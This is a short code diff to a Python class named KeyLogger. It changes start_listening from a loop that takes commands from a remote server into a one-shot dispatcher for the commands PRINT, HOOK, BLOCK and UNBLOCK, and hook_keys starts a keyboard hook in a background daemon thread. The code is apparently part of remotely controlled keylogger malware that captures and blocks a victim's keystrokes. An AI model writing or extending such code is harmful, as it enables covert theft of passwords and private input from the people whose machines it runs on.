@@ -7,7 +7,7 @@ class KeyLogger:
         self.server = server
         self.hooker = Hooker()
 
-    def start_listening(self):
+    def start_listening(self, s):
         dict = {
             "PRINT": self.print_keys,
             "HOOK": self.hook_keys,
@@ -16,13 +16,11 @@ class KeyLogger:
             "UNBLOCK": self.unblock_keys,
         }
 
-        while True:
-            s = self.server.receive_signal()
+        if s in dict:
+            dict[s]()
+            return True
 
-            if s in dict:
-                dict[s]()
-            elif s == "QUIT":
-                break
+        return False
 
     def hook_keys(self):
         threading.Thread(target=self.hooker.start, daemon=True).start()
